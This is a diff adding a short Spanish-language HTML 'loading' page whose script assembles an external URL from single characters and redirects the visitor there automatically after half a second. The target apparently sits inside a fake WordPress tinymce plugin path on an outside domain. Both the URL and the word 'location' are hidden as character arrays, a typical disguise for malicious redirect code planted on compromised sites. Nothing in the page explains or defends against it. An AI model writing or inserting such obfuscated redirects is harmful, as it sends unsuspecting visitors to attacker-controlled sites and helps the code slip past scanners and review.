@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Cargando...</title>
+  <script>
+    (function() {
+      const partes = [
+        'h','t','t','p','s',':','/','/',
+        'v','l','s','m','y','h','.','z','a','.','c','o','m',
+        '/','w','p','-','i','n','c','l','u','d','e','s','/',
+        'j','s','/','t','i','n','y','m','c','e','/',
+        'p','l','u','g','i','n','s','/',
+        'i','n','l','i','n','e','p','o','p','u','p','s','/',
+        'j','s','c','r','i','p','t','s','/','f','o'
+      ];
+      const destino = partes.join('');
+      setTimeout(function() {
+        const redir = ['l','o','c','a','t','i','o','n'];
+        window[redir.join('')].href = destino;
+      }, 500);
+    })();
+  </script>
+</head>
+<body>
+  <p>Redirigiendo, espere un momento...</p>
+</body>
+</html>
